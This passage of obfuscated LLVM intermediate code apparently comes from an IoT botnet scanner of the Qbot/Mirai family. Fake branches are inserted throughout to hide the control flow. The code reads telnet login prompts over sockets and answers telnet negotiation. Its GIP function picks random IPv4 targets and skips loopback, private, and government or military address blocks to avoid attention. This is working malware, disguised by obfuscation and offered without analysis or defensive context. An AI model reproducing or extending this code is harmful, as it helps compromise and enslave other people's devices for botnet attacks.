  %270 = icmp ne i8* %269, null
  br i1 %270, label %278, label %271

; <label>:271:                                    ; preds = %266
  %272 = load i32, i32* %12, align 4
  %273 = icmp ne i32 %272, 0
  br i1 %273, label %274, label %279

; <label>:274:                                    ; preds = %271
  %275 = load i8*, i8** %15, align 8
  %276 = call i32 @matchPrompt(i8* %275)
  %277 = icmp ne i32 %276, 0
  br i1 %277, label %278, label %279

; <label>:278:                                    ; preds = %274, %266
  store i32 1, i32* %20, align 4
  br label %281

; <label>:279:                                    ; preds = %274, %271
  br label %280

; <label>:280:                                    ; preds = %279, %originalBBpart275
  br label %33

; <label>:281:                                    ; preds = %278, %originalBBpart242, %64
  %282 = load i32, i32* %20, align 4
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %284, label %285

; <label>:284:                                    ; preds = %281
  store i32 1, i32* %9, align 4
  br label %286

; <label>:285:                                    ; preds = %281
  store i32 0, i32* %9, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %284, %originalBBpart271, %207, %originalBBpart246
  %287 = load i32, i32* @x.69
  %288 = load i32, i32* @y.70
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %286
  %295 = load i32, i32* %9, align 4
  %296 = load i32, i32* @x.69
  %297 = load i32, i32* @y.70
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  ret i32 %295

originalBBalteredBB:                              ; preds = %originalBB, %42
  %304 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %305 = load i64, i64* %304, align 8
  %306 = icmp sgt i64 %305, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %76
  %307 = load i32, i32* %10, align 4
  %_ = sub i32 %307, 64
  %gen = mul i32 %_, 64
  %_2 = sub i32 0, %307
  %gen3 = add i32 %_2, 64
  %_4 = sub i32 0, %307
  %gen5 = add i32 %_4, 64
  %_6 = shl i32 %307, 64
  %_7 = shl i32 %307, 64
  %308 = srem i32 %307, 64
  %309 = zext i32 %308 to i64
  %_8 = shl i64 1, %309
  %_9 = shl i64 1, %309
  %_10 = sub i64 1, %309
  %gen11 = mul i64 %_10, %309
  %_12 = sub i64 0, 1
  %gen13 = add i64 %_12, %309
  %310 = shl i64 1, %309
  %311 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %312 = load i32, i32* %10, align 4
  %_14 = sub i32 0, %312
  %gen15 = add i32 %_14, 64
  %_16 = sub i32 0, %312
  %gen17 = add i32 %_16, 64
  %313 = sdiv i32 %312, 64
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds [16 x i64], [16 x i64]* %311, i64 0, i64 %314
  %316 = load i64, i64* %315, align 8
  %_18 = sub i64 0, %316
  %gen19 = add i64 %_18, %310
  %_20 = shl i64 %316, %310
  %_21 = shl i64 %316, %310
  %_22 = sub i64 0, %316
  %gen23 = add i64 %_22, %310
  %_24 = sub i64 0, %316
  %gen25 = add i64 %_24, %310
  %_26 = shl i64 %316, %310
  %_27 = shl i64 %316, %310
  %317 = or i64 %316, %310
  store i64 %317, i64* %315, align 8
  %318 = load i32, i32* %10, align 4
  %_28 = sub i32 0, %318
  %gen29 = add i32 %_28, 1
  %_30 = sub i32 %318, 1
  %gen31 = mul i32 %_30, 1
  %_32 = sub i32 0, %318
  %gen33 = add i32 %_32, 1
  %_34 = sub i32 %318, 1
  %gen35 = mul i32 %_34, 1
  %_36 = shl i32 %318, 1
  %319 = add nsw i32 %318, 1
  %320 = call i32 @select(i32 %319, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %321 = icmp slt i32 %320, 1
  br label %originalBB1

originalBB40alteredBB:                            ; preds = %originalBB40, %108
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %139
  store i32 0, i32* %9, align 4
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %164
  %322 = load i32, i32* %10, align 4
  %323 = load i8*, i8** %23, align 8
  %324 = getelementptr inbounds i8, i8* %323, i64 1
  %325 = call i64 @recv(i32 %322, i8* %324, i64 2, i32 0)
  %326 = trunc i64 %325 to i32
  store i32 %326, i32* %19, align 4
  %327 = load i32, i32* %19, align 4
  %328 = icmp eq i32 %327, -1
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %188
  %329 = load i32, i32* %19, align 4
  %330 = icmp eq i32 %329, 0
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %208
  %331 = load i32, i32* %19, align 4
  %332 = load i32, i32* %18, align 4
  %_57 = sub i32 0, %332
  %gen58 = add i32 %_57, %331
  %_59 = sub i32 %332, %331
  %gen60 = mul i32 %_59, %331
  %_61 = sub i32 0, %332
  %gen62 = add i32 %_61, %331
  %_63 = shl i32 %332, %331
  %_64 = shl i32 %332, %331
  %_65 = shl i32 %332, %331
  %333 = add nsw i32 %332, %331
  store i32 %333, i32* %18, align 4
  %334 = load i32, i32* %10, align 4
  %335 = load i8*, i8** %23, align 8
  %336 = call i32 @negotiate(i32 %334, i8* %335, i32 3)
  %337 = icmp ne i32 %336, 0
  br label %originalBB56

originalBB69alteredBB:                            ; preds = %originalBB69, %232
  store i32 0, i32* %9, align 4
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %249
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %286
  %338 = load i32, i32* %9, align 4
  br label %originalBB77
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = load i32, i32* @x.71
  %2 = load i32, i32* @y.72
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [16 x i8], align 16
  %10 = call i32 @rand() #3
  %11 = srem i32 %10, 223
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %13 = call i32 @rand() #3
  %14 = srem i32 %13, 255
  %15 = trunc i32 %14 to i8
  store i8 %15, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %16 = call i32 @rand() #3
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %19 = call i32 @rand() #3
  %20 = srem i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %22 = load i32, i32* @x.71
  %23 = load i32, i32* @y.72
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2767, %originalBBpart2
  %31 = load i32, i32* @x.71
  %32 = load i32, i32* @y.72
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %30
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 127
  %42 = load i32, i32* @x.71
  %43 = load i32, i32* @y.72
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %41, label %5234, label %50

; <label>:50:                                     ; preds = %originalBBpart211
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %5234, label %54

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 3
  br i1 %57, label %5234, label %58

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 15
  br i1 %61, label %5234, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 56
  br i1 %65, label %5234, label %66

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br i1 %69, label %5234, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 25
  br i1 %73, label %5234, label %74

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 49
  br i1 %77, label %5234, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 50
  br i1 %81, label %5234, label %82

; <label>:82:                                     ; preds = %78
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 137
  br i1 %85, label %5234, label %86

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 6
  br i1 %89, label %5234, label %90

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 7
  br i1 %93, label %5234, label %94

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 11
  br i1 %97, label %5234, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i32, i32* @x.71
  %100 = load i32, i32* @y.72
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %98
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 21
  %110 = load i32, i32* @x.71
  %111 = load i32, i32* @y.72
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %109, label %5234, label %118

; <label>:118:                                    ; preds = %originalBBpart215
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 22
  br i1 %121, label %5234, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* @x.71
  %124 = load i32, i32* @y.72
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %122
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 26
  %134 = load i32, i32* @x.71
  %135 = load i32, i32* @y.72
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %133, label %5234, label %142

; <label>:142:                                    ; preds = %originalBBpart219
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 28
  br i1 %145, label %5234, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @x.71
  %148 = load i32, i32* @y.72
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %146
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 29
  %158 = load i32, i32* @x.71
  %159 = load i32, i32* @y.72
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %157, label %5234, label %166

; <label>:166:                                    ; preds = %originalBBpart223
  %167 = load i32, i32* @x.71
  %168 = load i32, i32* @y.72
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %166
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 30
  %178 = load i32, i32* @x.71
  %179 = load i32, i32* @y.72
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %177, label %5234, label %186

; <label>:186:                                    ; preds = %originalBBpart227
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 33
  br i1 %189, label %5234, label %190

; <label>:190:                                    ; preds = %186
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 55
  br i1 %193, label %5234, label %194

; <label>:194:                                    ; preds = %190
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 214
  br i1 %197, label %5234, label %198

; <label>:198:                                    ; preds = %194
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 215
  br i1 %201, label %5234, label %202

; <label>:202:                                    ; preds = %198
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 192
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %202
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 168
  br i1 %209, label %5234, label %210

; <label>:210:                                    ; preds = %206, %202
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 146
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %210
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 17
  br i1 %217, label %5234, label %218

; <label>:218:                                    ; preds = %214, %210
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 146
  br i1 %221, label %222, label %226

; <label>:222:                                    ; preds = %218
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 80
  br i1 %225, label %5234, label %226

; <label>:226:                                    ; preds = %222, %218
  %227 = load i32, i32* @x.71
  %228 = load i32, i32* @y.72
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 146
  %238 = load i32, i32* @x.71
  %239 = load i32, i32* @y.72
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %237, label %246, label %250

; <label>:246:                                    ; preds = %originalBBpart231
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 98
  br i1 %249, label %5234, label %250

; <label>:250:                                    ; preds = %246, %originalBBpart231
  %251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 146
  br i1 %253, label %254, label %258

; <label>:254:                                    ; preds = %250
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 154
  br i1 %257, label %5234, label %258

; <label>:258:                                    ; preds = %254, %250
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 147
  br i1 %261, label %262, label %266

; <label>:262:                                    ; preds = %258
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 159
  br i1 %265, label %5234, label %266

; <label>:266:                                    ; preds = %262, %258
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 148
  br i1 %269, label %270, label %290

; <label>:270:                                    ; preds = %266
  %271 = load i32, i32* @x.71
  %272 = load i32, i32* @y.72
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %270
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 114
  %282 = load i32, i32* @x.71
  %283 = load i32, i32* @y.72
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %281, label %5234, label %290

; <label>:290:                                    ; preds = %originalBBpart235, %266
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 150
  br i1 %293, label %294, label %298

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 125
  br i1 %297, label %5234, label %298

; <label>:298:                                    ; preds = %294, %290
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 150
  br i1 %301, label %302, label %306

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 133
  br i1 %305, label %5234, label %306

; <label>:306:                                    ; preds = %302, %298
  %307 = load i32, i32* @x.71
  %308 = load i32, i32* @y.72
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %306
  %315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 150
  %318 = load i32, i32* @x.71
  %319 = load i32, i32* @y.72
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %317, label %326, label %346

; <label>:326:                                    ; preds = %originalBBpart239
  %327 = load i32, i32* @x.71
  %328 = load i32, i32* @y.72
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %326
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 144
  %338 = load i32, i32* @x.71
  %339 = load i32, i32* @y.72
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %337, label %5234, label %346

; <label>:346:                                    ; preds = %originalBBpart243, %originalBBpart239
  %347 = load i32, i32* @x.71
  %348 = load i32, i32* @y.72
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %346
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 150
  %358 = load i32, i32* @x.71
  %359 = load i32, i32* @y.72
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %357, label %366, label %370

; <label>:366:                                    ; preds = %originalBBpart247
  %367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %368 = zext i8 %367 to i32
  %369 = icmp eq i32 %368, 149
  br i1 %369, label %5234, label %370

; <label>:370:                                    ; preds = %366, %originalBBpart247
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 150
  br i1 %373, label %374, label %378

; <label>:374:                                    ; preds = %370
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 157
  br i1 %377, label %5234, label %378

; <label>:378:                                    ; preds = %374, %370
  %379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 150
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %378
  %383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 184
  br i1 %385, label %5234, label %386

; <label>:386:                                    ; preds = %382, %378
  %387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 150
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %386
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 190
  br i1 %393, label %5234, label %394

; <label>:394:                                    ; preds = %390, %386
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 150
  br i1 %397, label %398, label %418

; <label>:398:                                    ; preds = %394
  %399 = load i32, i32* @x.71
  %400 = load i32, i32* @y.72
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %398
  %407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %408 = zext i8 %407 to i32
  %409 = icmp eq i32 %408, 196
  %410 = load i32, i32* @x.71
  %411 = load i32, i32* @y.72
  %412 = sub i32 %410, 1
